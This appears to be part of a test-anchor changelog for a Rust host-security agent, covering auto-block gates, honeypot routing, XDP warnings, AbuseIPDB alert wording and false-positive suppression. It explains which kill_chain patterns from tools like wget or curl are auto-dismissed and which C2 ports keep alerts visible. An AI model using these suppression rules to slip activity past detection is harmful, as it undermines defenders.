Operator's prod doctor printed `[fail] nginx error log not found (/home/ubuntu/proxy/data/logs/fallback_error.log)` with hint "log is created on first request or error" — hard fail contradicting the hint, on a healthy server with a custom nginx config that simply had not errored yet. Fix: probe a small list of common defaults before reporting; downgrade missing-everywhere to `[warn]` because nginx writes the file lazily.

- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_missing_warns_not_fails` — Bug 4 anchor: a missing nginx error log emits `[warn]`, NOT `[fail]`. Anti-regression for the prod hard-fail contradicting the lazy-creation invariant. Pins that the old "Start nginx" hint is gone.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_alternative_present_warns_with_both_paths` — Bug 4 anchor: when the configured path is missing but a default (`/var/log/nginx/error.log`) exists, the warn message surfaces BOTH paths and suggests aligning the sensor config. Pins the discovery contract so a future refactor cannot silently drop the alternative-path probe.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_alternatives_all_missing_falls_through_to_warn` — Bug 4 anchor: alternative paths that don't exist behave the same as no alternatives (still Warn, "not yet written" copy). Pins the negative branch of the discovery probe.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_present_with_alternatives_is_still_ok` — happy-path anchor: configured path exists → Ok regardless of alternatives. Anti-regression for accidentally widening the warn branches into the present-path case.

### Boot loop coverage push (PR #486 follow-up — 2026-05-07)

The four pre-existing `run_agent` integration tests (above this section in source order) all use `cli.once = true`, leaving the entire non-once orchestration branch uncovered (700+ lines of telegram polling spawn, honeypot always-on, mesh discovery, the slow-loop `tokio::select!`, and the `cfg.report` / `cleanup_015` / `backfill_015` / `retrain_anomaly` dispatch arms). Coverage stalled at ~34%. These anchors push it past 60% without fake tests; assertions verify operator-observable side effects, not just the absence of panics.

- `crates/agent/src/loops/boot.rs::tests::run_agent_non_once_spawns_orchestration_paths` — full integration anchor: drives `run_agent` in non-once mode for 8s with a feature-rich config (mesh, slack, cloudflare, crowdsec, geoip, fail2ban, webhook all enabled) + dashboard on a random local port + seeded events/incidents JSONL. Asserts `outcome.is_err()` (the loop must keep running until cancelled by the timeout — early Ok would mean the loop exited prematurely, e.g. from a config-validation regression), AND `incident-groups.json` exists + parses as JSON (proves the slow-loop tick fired AND the snapshot path the dashboard reads is still wired), AND `innerwarden.db` exists (proves the SQLite store init path executed end-to-end). Anti-regression for silent boot failures the once-mode tests cannot catch.
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_cleanup_015_flag` — pins the `cli.cleanup_015_graph_signal_quality` dispatch wiring inside `run_agent`. With an empty data_dir the underlying function bails with "No dated snapshot found" — this anchor pins that the flag actually routes to that function (a future refactor that drops the `if cli.cleanup_015_graph_signal_quality { ... }` branch would silently break the operator's `--cleanup-015-graph-signal-quality` CLI flag).
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_backfill_015_flag` — same as above for `cli.backfill_015_research_only`.
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_retrain_anomaly_flag` — same for `cli.retrain_anomaly`. Pins the operator-facing `--retrain-anomaly` dispatch.
- `crates/agent/src/loops/boot.rs::tests::run_agent_report_mode_with_explicit_report_dir_creates_it` — extends the existing report-mode test to cover the `Some(report_dir)` branch. Asserts `create_dir_all` actually materialises the configured directory (anti-regression for accidentally dropping the dir-creation step, which would surface as "no such file or directory" on a fresh server).
- `crates/agent/src/loops/boot.rs::tests::should_run_periodic_tick_truth_table` — extracted-helper anchor: the slow-loop's "every N seconds, only if there is something to consolidate" gate (intel consolidation, feedback tracker, env census, monthly report) was inline duplicated at every call site. Extracted into `should_run_periodic_tick(last_run_at, interval_secs, has_work)` so the time × work × boot-path interaction is unit-testable. Pins all four corners of the truth table.

### orphan_recovery sweep contract (test/coverage-batch-2 — 2026-05-07)

Phase 7B (RC-2) introduced the orphan-recovery sweep that auto-dismisses incidents abandoned by the AI router. The original module shipped with three tests covering only `extract_target_ip` plus one end-to-end `find_orphan_incidents` SoT contract test. The actual `run_sweep` function (the operator-visible surface — wires hostname, age formatting, target_ip extraction, the sqlite_store gate, and the dismiss-decision append into one path) was not exercised, so a regression in any of those wires would only surface in production. These anchors pin the contract that the sweep auto-dismisses ONLY old + decisionless + non-allowlisted incidents and labels every row as `ai_provider="orphan-recovery"` so the audit log cannot lie about who took the action.

- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_returns_none_when_entities_missing` — the entity-extractor returns None when the JSON has no `entities` field. Pins the negative branch of `parsed.get("entities")?`.
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_returns_none_when_entities_is_not_array` — pins the `as_array()?` negative branch (covers a future schema regression that nests `entities` under an object instead of an array).
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_skips_empty_value_strings` — the `if !value.is_empty()` guard skips IP entities with blank values and falls through to the next one. Pins the contract that "first IP entity, but not a blank one" is what the dismiss-decision rows record as `target_ip`.
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_is_case_insensitive_on_kind` — the kind comparison uses `eq_ignore_ascii_case` so a future schema change that capitalises the type ("IP" vs "ip") wouldn't silently drop target_ip from every dismiss row.
- `crates/agent/src/orphan_recovery.rs::tests::hostname_prefers_env_var_when_set` — `hostname()` returns the `HOSTNAME` env var when present, AND the result is non-empty (the contract `DecisionEntry::host` relies on so the audit log never carries empty hostnames). Pins the env-first fallback chain so dismiss decisions in containerised deployments (where HOSTNAME is the canonical hostname) match the rest of the audit log.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_returns_zero_when_sqlite_store_is_none` — when `state.sqlite_store == None` (e.g. the sqlite-reopen retry path during boot) `run_sweep` early-returns 0 without panicking and without writing anything to the existing decisions JSONL. Anti-regression for a future change that allocates a DecisionEntry before the gate.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_returns_zero_when_store_has_no_orphans` — empty store → empty orphan vec → early-return 0 BEFORE the loop body. Pins the empty-bucket fast path; covers the second early-return branch in the function.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_writes_dismiss_decision_for_old_orphan` — happy-path end-to-end: an old, decisionless, non-allowlisted incident gets exactly one dismiss decision written with `ai_provider="orphan-recovery"`, `action_type="dismiss"`, the reason text mentions "orphan-recovery sweep" + an `<H>h<M>m` age fragment (so the operator can grep for it), AND the JSONL audit file is materialised on disk. Pins the operator-visible audit-trail shape.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_extracts_target_ip_from_incident_data` — the dismiss decision carries the orphan's first IP entity as `target_ip`. Pins the integration between `extract_target_ip` and the SQLite `data` column round-trip so attacker-IP dashboards correctly attribute auto-dismissed rows.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_skips_fresh_and_decided_and_allowlisted_incidents` — full SoT enforcement: with one row of each shape (fresh, already-decided, allowlisted, real-orphan) co-resident in the store, `run_sweep` writes exactly one decision and only on the real-orphan row. Pins the SQL filter contract one layer up; without this anchor a future bug that widens the JOIN/WHERE would silently auto-dismiss real pending-AI work.

### Honeypot routing + suggestion (test/coverage-batch-2 — 2026-05-07)

- `crates/agent/src/incident_honeypot_router.rs::tests::detector_from_incident_id_uses_prefix_before_colon` — pure helper: returns prefix before first colon from `incident_id`. Pins downstream router decisions key off the parsed detector name, not the full id.
- `crates/agent/src/incident_honeypot_router.rs::tests::primary_ip_from_incident_returns_ip_entity_only` — only first `EntityType::Ip` entity, ignores User/Container/etc. Anti-regression for routing operators into the honeypot via misclassified entity types.
- `crates/agent/src/incident_honeypot_router.rs::tests::should_route_to_honeypot_prioritizes_new_suspicious_login_attackers` — pins the `suspicious_login` detector branch: routes regardless of sampling probability.
- `crates/agent/src/incident_honeypot_router.rs::tests::should_route_to_honeypot_samples_ssh_attackers_and_respects_allowlist` — both arms: allowlisted IPs never routed (operator honesty); non-allowlisted subject to deterministic sampling.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_short_circuits_when_mode_is_not_listener` — operator opt-in: `mode != "listener"` short-circuits before audit.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_short_circuits_when_responder_disabled` — watch-mode invariant: no auto-redirect when responder read-only.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_incident_has_no_ip_entity` — defensive: incident without Ip entity skips routing instead of panicking.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_router_declines_detector` — non-eligible detectors (e.g. `port_scan`) are skipped even when other gates pass.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_caller_blocked_set_already_contains_ip` — idempotency: IP already in caller's blocked set is not re-routed (no double-audit).
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_for_already_blocked_attacker` — global-blocklist dedup: already firewall-blocked IPs skip honeypot redirect.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_skips_allowlisted_ssh_attackers` — allowlist + sampling are orthogonal gates; allowlisted always wins.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_writes_decision_and_arms_cooldown_for_new_suspicious_login` — happy-path: new suspicious_login → audit row tagged `ai_provider="honeypot-router"`, cooldown set, caller's blocked-set updated.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::returns_false_when_no_telegram_client` — no Telegram = no suggestion (returns false before building Incident or audit).
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::returns_false_when_action_is_not_honeypot` — only honeypot-action AiDecisions trigger this path; block-ip/suspend-user flow normal pipeline.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::auto_executes_when_high_confidence_and_auto_execute` — auto-fire: confidence ≥ threshold AND `auto_execute=true` writes real-execution audit row.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::auto_execute_skipped_when_confidence_below_threshold` — confidence below threshold falls through to defer even when `auto_execute=true`.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_to_operator_when_telegram_succeeds` — defer path: successful Telegram send → `dry_run` audit row tagged `ai_provider="honeypot-suggestion"`, returns true (handled).
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_with_dry_run_flag_propagated_to_audit` — `dry_run` flag preserved end-to-end so post-incident review distinguishes suggested-then-confirmed vs suggested-then-ignored.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_without_audit_when_decision_writer_is_none` — defensive: missing writer (early boot/fault) returns true without panic.

### Coverage batch 3 (test/coverage-batch-3 — 2026-05-07)

Same operator hard-rule that drove batches 1+2: "≥70% coverage in the same PR as the code." This batch raises the worst-covered modules in the agent runtime — most of these test the early-exit / gate / disabled-feature branches that ship a lot of dead code paths in production but are rarely exercised by the existing happy-path tests. Together these anchors pin the *gate* contracts so that toggling `responder.enabled`, `correlation.enabled`, or removing optional clients (geoip / abuseipdb / threat_feed / decision_writer) cannot silently change the runtime's behaviour.

#### Decide-skill actions surface

- `crates/agent/src/decision_skill_actions.rs::tests::ignore_action_returns_formatted_reason` — the `Ignore` action emits a stable reason string that the audit log keys off. Anti-regression for any change that drops the reason or wraps it in an Err.
- `crates/agent/src/decision_skill_actions.rs::tests::dismiss_action_returns_formatted_reason` — same for `Dismiss`. Pins the audit-row shape produced by both no-op verdicts.
- `crates/agent/src/decision_skill_actions.rs::tests::unhandled_actions_return_none` — actions outside the explicit match table return `None` (caller falls through). Pins the closed-set contract: adding a new variant requires touching this dispatcher.
- `crates/agent/src/decision_skill_actions.rs::tests::suspend_user_sudo_blocks_when_not_in_allowed_skills` — `suspend_user_sudo` is gated by `allowed_skills`; an empty allowlist must NOT execute. Operator-facing: the safety gate that prevents a misconfigured deployment from auto-sudo-locking users.
- `crates/agent/src/decision_skill_actions.rs::tests::kill_process_blocks_when_not_in_allowed_skills` — same gate for `kill_process`. Anti-regression for dropping the gate when refactoring the dispatcher.
- `crates/agent/src/decision_skill_actions.rs::tests::block_container_blocks_when_not_in_allowed_skills` — same gate for `block_container`.
- `crates/agent/src/decision_skill_actions.rs::tests::suspend_user_sudo_executes_in_dry_run_when_allowed_and_registered` — the happy path: skill in allowlist + registered in registry + responder.dry_run = the dispatcher actually invokes the skill. Pins the registry round-trip.
- `crates/agent/src/decision_skill_actions.rs::tests::kill_chain_response_skips_when_skill_missing_without_allowlist_gate` — when the kill-chain skill isn't registered, the dispatcher returns `None` instead of panicking. Pins the missing-skill defensive branch.
- `crates/agent/src/decision_skill_actions.rs::tests::monitor_skips_when_skill_missing` — same for `monitor_ip`.

#### Pre-AI prelude (correlation + LSM auto-enable)

- `crates/agent/src/incident_prelude.rs::tests::correlation_disabled_returns_empty_and_does_not_observe` — when `cfg.correlation.enabled = false` the prelude returns an empty Vec AND must NOT call `correlator.observe()`. Pins the off-state contract: toggling correlation off-then-on cannot silently feed events the operator wanted excluded.
- `crates/agent/src/incident_prelude.rs::tests::correlation_enabled_observes_even_when_no_related_incidents_yet` — first incident has no relatives but observe() must run, so a second incident with the same pivot can correlate. Pins the "observe early" contract that keeps history consistent across gate-skipped incidents.
- `crates/agent/src/incident_prelude.rs::tests::lsm_auto_enable_skipped_when_already_enabled` — when `state.lsm_enabled = true` the auto-enable branch is skipped entirely, even for an incident that would normally trigger it. Pins the one-way-only escalation contract.

#### Auto-rule fast path

- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_short_circuits_when_responder_disabled` — Watch mode (responder.enabled = false) suppresses every auto-rule path, even for high-severity detectors. Pins the operator's read-only invariant.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_short_circuits_when_auto_rules_disabled` — operator-tunable kill switch: `auto_rules_enabled = false` disables the path without disabling the responder.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_returns_false_for_non_auto_rule_detector` — only the explicit auto-rule detector list routes through this path. A non-listed detector (e.g. `packet_flood`) returns false. Anti-regression for accidentally widening the trigger set.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_internal_ips` — internal/private IPs are NEVER auto-blocked. Pins the network-attack-surface invariant.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_allowlisted_ips` — IPs on the static `cfg.trusted_ips` list AND the runtime `dynamic_trusted_ips` list are skipped. Pins both halves of the operator allowlist contract.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_active_operator_sessions` — IPs with active operator sessions skip auto-block (matches `incident_obvious` policy). Pins the same-session-no-block contract.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_happy_path_writes_decision_and_sets_cooldown` — happy path: enabled responder + auto-rule detector + external IP + no operator session = block fires AND cooldown is armed. Anti-regression for any change that skips cooldown arming (would cause re-block thrash).
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_respects_cooldown_window` — second invocation within cooldown window returns false. Pins the rate-limit contract that prevents block-storm.

#### Obvious-incident fast path

- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_full_happy_path_for_first_hit_detector` — first hit on an obvious-detector incident (e.g. `reverse_shell`) writes a decision JSONL row, updates `ip_reputations`, and arms the cooldown. Pins the audit-trail shape produced before the AI router ever runs.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_skips_active_operator_session` — incidents from IPs with an active operator session are NEVER auto-blocked, regardless of detector severity. Same-session-no-block invariant mirroring `incident_auto_rules`.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_skips_when_no_ip_entity` — incidents missing an IP entity fall through without panicking and without writing decisions. Defensive contract for the entity-extraction step.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_returns_false_for_non_obvious_detector` — only the explicit obvious-detector list routes through this fast path. Anti-regression for widening the obvious set without operator review.

#### Forensics capture early-exit

- `crates/agent/src/incident_forensics.rs::tests::capture_incident_forensics_with_skips_forensics_when_pid_missing` — high-severity incidents without `pid` in evidence skip the forensics adapter while pcap still fires from the IP entity. Pins the missing-PID branch (`evidence.get("pid")` returning None).
- `crates/agent/src/incident_forensics.rs::tests::capture_incident_forensics_with_skips_pcap_when_no_ip_entity` — high-severity incidents without an IP entity skip the pcap adapter while forensics still fires from the PID. Pins the missing-IP branch.

#### Advisory cache consumption

- `crates/agent/src/incident_advisory.rs::tests::handle_advisory_violation_consumes_advisory_even_when_telegram_client_present` — the matched cache entry is removed regardless of whether the Telegram alert succeeded, was rate-limited, or dropped. Pins the cache-consume contract: a stale advisory cannot re-fire the same alert across executions.
- `crates/agent/src/incident_advisory.rs::tests::handle_advisory_violation_skips_when_evidence_is_not_array` — non-array `incident.evidence` falls through to the no-match branch instead of panicking. Pins the schema-defensive Option-chain (`evidence.as_array()?`).

#### Enrichment optional-client gates

- `crates/agent/src/incident_enrichment.rs::tests::log_threat_feed_match_returns_when_threat_feed_disabled` — `state.threat_feed = None` short-circuits before any IP lookup. Pins the optional-client contract.
- `crates/agent/src/incident_enrichment.rs::tests::lookup_incident_geoip_returns_none_when_client_disabled` — same for `geoip_client`. The `?` short-circuit must keep the function from synthesising a default GeoInfo.
- `crates/agent/src/incident_enrichment.rs::tests::enrich_attacker_identity_returns_early_when_no_inputs` — both `ip_geo` and `ip_reputation` None means no profile creation, no `attacker_profiles` mutation. Pins the cheap-exit contract on the very first line.
- `crates/agent/src/incident_enrichment.rs::tests::enrich_attacker_identity_skips_when_no_ip_entity` — incidents without an IP entity walk the entities list, find nothing, and skip the mutation block — even with valid GeoIP/AbuseIPDB inputs.
- `crates/agent/src/incident_enrichment.rs::tests::backfill_enrichment_returns_early_when_no_clients` — both clients None = early return without touching `attacker_profiles` or SQLite. Pins the nothing-to-do exit at the top of the function.

#### Auto-dismiss noise gate

- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_false_when_responder_disabled` — Watch mode (responder.enabled = false) keeps every low-severity incident visible. Pins the operator hard rule that auto-dismiss only fires in Guard mode.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_false_when_dry_run` — DryRun mode mirrors Watch mode for the noise gate. Pins the second half of `is_noise_gate_eligible`.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_true_in_guard_mode` — happy path: Guard mode + low-severity = true (auto-dismiss). Pins the body of the function (decision-writer attempt + KG ingest_decision call).

### XDP infra honesty (fix/xdp-infra-honesty — 2026-05-08)

A 2026-05-08 prod audit found three cascading honesty bugs that left the agent emitting `XDP firewall unavailable` warnings every 5 minutes for 24+ hours with a fix recipe that wouldn't help:

1. **Sensor systemd unit had `/sys/fs/bpf` in `ReadOnlyPaths`** so the sensor couldn't create `/sys/fs/bpf/innerwarden/` and silently failed every map pin (BLOCKLIST + ALLOWLIST + LSM_POLICY + CGROUP_CAPABILITIES + COMM_CAPABILITIES). The unit was the canonical example file under `examples/systemd/`.
2. **Sensor's `attach_xdp` early-returned** when `xdp.attach()` returned EBUSY (a previous lifetime's link still attached at the kernel level), skipping the pin step entirely. So a sensor restart actively REMOVED wire-speed blocking until the operator manually detached the stale link.
3. **Agent's WARN told the operator to mount bpffs** even when bpffs was mounted. The hard-coded recipe ignored the actual on-disk state.

Plus a fourth bug surfaced as a side effect:

4. **`decision_block_ip` called `mark_failed` from the shield path's Err arm** before the standalone fallback even ran. The standalone path then succeeded milliseconds later — but the WARN had already fired, so the operator's journal showed `XDP firewall unavailable` on the same timestamp as `blocked via XDP (wire-speed drop)`. Straight up dishonest.

The anchors below pin each contract.

- `crates/agent/src/xdp_availability.rs::tests::diagnose_xdp_state_returns_actionable_recipe_for_observable_state` — `diagnose_xdp_state` returns a state-specific recipe (mount / `ReadWritePaths` / `link detach` / log inspection) rather than the pre-fix hard-coded mount recipe. Pins the operator-honesty contract that the WARN's recipe matches actual on-disk state.
- `crates/agent/src/decision_block_ip.rs::tests::xdp_failure_to_warn_suppresses_shield_failure_when_standalone_succeeds` — when the standalone XDP path succeeds, ANY shield-path failure is silently dropped. Anti-regression for the prod bug where `XDP firewall unavailable` and `blocked via XDP` fired on the same timestamp.
- `crates/agent/src/decision_block_ip.rs::tests::xdp_failure_to_warn_returns_none_when_nothing_was_attempted` — gate-skipped or no-XDP-skill path returns None (no WARN). Cheap-exit contract.
- `crates/agent/src/decision_block_ip.rs::tests::xdp_failure_to_warn_returns_standalone_failure_when_no_path_succeeded` — standalone-only failure surfaces with `block-ip-xdp skill` context. Pins the path-of-last-resort precedence.
- `crates/agent/src/decision_block_ip.rs::tests::xdp_failure_to_warn_combines_both_errors_when_neither_path_succeeds` — both-failed WARN includes both error messages. Anti-regression for accidentally dropping one of the two.
- `crates/agent/src/decision_block_ip.rs::tests::xdp_failure_to_warn_surfaces_shield_failure_when_standalone_not_attempted` — shield-only failure (no `block-ip-xdp` skill registered) surfaces verbatim. Pins the path where shield is the only XDP backend.

### AbuseIPDB + Telegram honesty (fix/abuseipdb-telegram-honesty — 2026-05-08)

Operator's prod 2026-05-07 received a Telegram alert reading "🛡 Instant kill - AbuseIPDB reputation gate ... Blocked 34.253.181.30 - known threat from reputation database. Score 8/100, 3 reports worldwide, Amazon Technologies Inc., Ireland". Calling Score 8/100 a "known threat" is dishonest — AbuseIPDB's own UI bands 0-24 as "low risk". Investigation surfaced four interlocking bugs that together make the alert worse than nothing:

1. `cloud_safelist::CLOUD_PROVIDER_RANGES` had a hole — `34.0.0.0/9` is GCP, AWS owns `34.192.0.0/10` (covering 34.192-34.255 = eu-west-1, eu-west-2, ap-northeast-1) and we never listed it. The IP leaked through the safelist gate.
2. `cloud_safelist::identify_provider`'s first-octet heuristic blanket-tagged 34.x as Google Cloud, so the journal log line said "Google Cloud" while the WHOIS panel said "Amazon" — operator-distrust amplifier.
3. `telegram::send_abuseipdb_autoblock` hard-coded "known threat from reputation database" for every score, regardless of how well-evidenced the block was.
4. The agent shipped with `auto_block_threshold = 1` in operator's prod (config doc recommends 75-90). At threshold 1 any IP with a single historical AbuseIPDB report auto-blocks. No startup signal told the operator their config was implausible.
5. `incident_autodismiss::try_autodismiss_sensor_self_traffic_fp` covered the `data_exfil_ebpf` and `reverse_shell` NSS-init FPs but not the `kill_chain` detector, which fires DATA_EXFIL on the same wget/curl/apt/cargo NSS-bundle-read pattern with a different evidence shape.

The anchors below pin each contract.

#### Cloud safelist AWS gap

- `crates/agent/src/cloud_safelist.rs::tests::aws_eu_west_1_range_is_in_safelist` — `34.253.181.30` (the prod IP) plus `34.192.0.0` and `34.255.255.255` (CIDR boundaries) are in the safelist; pre-fix the CIDR didn't exist. Anti-regression for the gap.
- `crates/agent/src/cloud_safelist.rs::tests::aws_eu_west_1_identifies_as_aws_not_google` — `identify_provider` for the same prod IP labels "AWS", not "Google Cloud". Pins the second-octet split at 34.128 boundary so the operator's journal log line matches the WHOIS data.

#### Telegram tier-aware copy

- `crates/agent/src/telegram/formatting.rs::tests::reputation_tier_label_uses_abuseipdb_band_thresholds` — `reputation_tier_label` returns four distinct labels at AbuseIPDB's published 25/50/75 boundaries. Pre-fix every score got "known threat".
- `crates/agent/src/telegram/formatting.rs::tests::reputation_action_phrase_does_not_hard_code_known_threat_for_low_scores` — score 8 phrase MUST NOT contain "known"; score 95 phrase MUST keep "known-threat" wording. Anti-regression for accidentally softening the strong language across the board.

#### kill_chain wget FP suppression

- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_dismisses_kill_chain_wget_pattern` — the exact prod incident shape (kill_chain DATA_EXFIL on wget, chain_bits = [socket, sensitive_read], c2_port = 0) is auto-dismissed.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_dismisses_kill_chain_for_all_nss_init_tools` — coverage for curl/apt/cargo/git/pip3 (the rest of NSS_INIT_TOOL_PREFIXES). Anti-regression for accidentally narrowing the comm match to just wget.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_does_not_dismiss_kill_chain_with_extra_bits` — a 3-bit chain (socket + sensitive_read + privesc) keeps the incident visible. Pins the bare-2-bit-only suppression so real attacker chains escape the filter.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_does_not_dismiss_kill_chain_with_c2_port` — non-zero c2_port (4444 / 1337 / etc) keeps the incident visible. Anti-regression for the kill_chain seeing an attacker-flagged port.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_sensor_self_traffic_fp_does_not_dismiss_kill_chain_unknown_comm` — unknown comm with the bare 2-bit chain still routes to AI. Pins the comm-allowlist gate so a bespoke attacker binary doesn't get the operator-tool free pass.

### Inline-decision vs AI-router race (fix/inline-decision-vs-ai-router-race — 2026-05-08)

Operator's prod 2026-05-08 dashboard showed `20.26.156.215` (Microsoft Azure UK / git-fetch FP) as a high-risk attacker (risk 71, 7 blocks). SQLite trace revealed two parallel decision writers fired on the same `kill_chain:detected:DATA_EXFIL:NNN:...` incident_id: `killchain_inline::dismiss_self_traffic_incidents` wrote `dismiss` (correct — the operator was running `git fetch git@github.com`), then 9 seconds later the agent's main triage loop processed the same incident through the AI router, which wrote `block_ip` from `local_classifier`. Two rows for one incident — the dashboard's Profiles tab credited the second row to the IP and surfaced operator self-traffic as a high-risk attacker, undermining trust in every other profile on the page.

The fix lifts the inline path's verdict to canonical: whoever lands the first decision row for an `incident_id` wins, and `evaluate_pre_ai_flow` short-circuits the AI router when a prior decision exists. SQLite's `idx_decisions_incident` index makes this an O(log N) lookup so the gate runs on every incident without measurable cost.

- `crates/store/src/decisions.rs::tests::has_decision_for_incident_returns_true_after_first_row_for_id` — `has_decision_for_incident` returns `false` for an unseen incident_id, `true` after a single row lands (regardless of `action_type`), keeps returning `true` after subsequent rows for the same id, and does not match unrelated incident_ids. Pins the cheap-exit + no-LIKE-overmatch contract.
- `crates/agent/src/incident_flow.rs::tests::evaluate_pre_ai_flow_returns_skip_handled_when_inline_decision_already_landed` — when SQLite has a `dismiss` row for the incident's id (seeded via the test as if `killchain_inline` had just written it), the gate returns `SkipHandled` and the AI router is not invoked. Anti-regression for the prod two-decision race that surfaced operator git-fetch traffic as a high-risk attacker.
- `crates/agent/src/incident_flow.rs::tests::evaluate_pre_ai_flow_does_not_short_circuit_when_no_existing_decision_for_incident` — fresh incident_id (with an UNRELATED row already in the table) does NOT trigger the new short-circuit. Pins the cheap-exit contract so a future LIKE-based over-match doesn't accidentally suppress the AI router on incidents whose ids happen to substring-match an unrelated row.

### Profiles cloud-provider badge (fix/profiles-cloud-provider-badge — 2026-05-08)

PR #492 closed the write-side of the inline-decision-vs-AI-router race so no new wrongly-credited "cloud-provider IP as high-risk attacker" rows can appear. This PR closes the read-side: the Profiles tab API enriches every row with a `cloud_provider` field that uses the SAME `cloud_safelist::identify_provider` predicate the autoblock gate consults, and accepts `?exclude_cloud=true` to drop those rows from the response. Pre-fix the operator's audit page listed Microsoft Azure / AWS edge IPs as risk-71+ attackers with no indication that the agent's own gate would have refused to block them — the dashboard contradicted the gate, and operator trust suffered.

- `crates/agent/src/dashboard/intelligence.rs::tests::enrich_with_cloud_provider_tags_known_clouds_and_leaves_others_null` — `enrich_with_cloud_provider` adds `cloud_provider = Some(label)` for AWS / Azure / Cloudflare IPs (uses the prod-data IPs `34.253.181.30`, `20.26.156.215`, `104.26.12.38`) and `null` for real attacker IPs. Pins the contract that the dashboard view never disagrees with the autoblock gate.
- `crates/agent/src/dashboard/intelligence.rs::tests::enrich_then_filter_exclude_cloud_drops_only_cloud_rows` — when the API caller passes `?exclude_cloud=true`, the response retains only rows where `cloud_provider` is null. Pins the operator-opt-in filter so the page can render a clean "real attackers only" view without losing the underlying data (the unfiltered view stays available by default).

### ASN-cluster geo consolidation (fix/profiles-asn-geo-consolidation — 2026-05-08)

Operator's prod audit 2026-05-08 found `92.118.39.23` listed as **US** while its five ASN-siblings `92.118.39.{195,196,197,235,236}` (all `AS47890 Unmanaged LTD` / Hosting24 NL bulletproof) listed as **NL**. Same ASN + same ISP + different country = ip-api.com returned bad data for the outlier at first-seen, and the agent never re-queried (`backfill_enrichment` only fills `geo.is_none()` profiles, not stale ones). The dashboard rendered the outlier under a US flag, contradicting the four siblings on the same page.

The fix consolidates at READ time inside `api_attacker_profiles`. When ≥3 profiles share an ASN AND ≥80% agree on a country, outlier profiles get their `geo.country_code` / `geo.country` rewritten to the majority and marked with `geo_consolidated_from_asn = true` so the dashboard / API consumer can surface the override. The persisted JSON keeps the original lookup for forensic record. Threshold ≥80% prevents over-correction on legitimately multi-region ASNs (AWS / GCP).

- `crates/agent/src/dashboard/intelligence.rs::tests::consolidate_geo_by_asn_overrides_outlier_country_in_clear_majority_asn` — uses the exact prod-audit scenario (4×NL + 1×US in `AS47890`) to pin the override + flag contract. The outlier US is rewritten to NL, the four siblings stay untouched, and only the overridden profile carries the `geo_consolidated_from_asn` flag.
- `crates/agent/src/dashboard/intelligence.rs::tests::consolidate_geo_by_asn_does_not_consolidate_below_threshold` — an ASN with only 2 profiles is below the `≥3` floor and must NOT trigger the override. Pins the floor that prevents one-off lookups from getting steamrolled by a single sibling.
- `crates/agent/src/dashboard/intelligence.rs::tests::consolidate_geo_by_asn_keeps_real_split_asns_intact` — a 60/40 split (3 NL + 2 US) in one ASN must stay intact (below the 80% agreement threshold). Pins the over-correction guard so legit multi-country ASNs (AWS / GCP) are not flattened.

### DNA stable fingerprint (fix/dna-stable-fingerprint — 2026-05-08)

Operator's prod audit 2026-05-08 found six `92.118.39.{195,196,197,235,236,...}` profiles all in `AS47890 Unmanaged LTD` (Hosting24 NL bulletproof) — same detector set `[proto_anomaly]`, same empty target_users / target_ports / tool_signatures, same `regular_scanner` pattern_class — but **six distinct DNA hashes**. The dashboard's Campaigns tab couldn't collapse them into one cluster, defeating the whole point of behavioral fingerprinting.

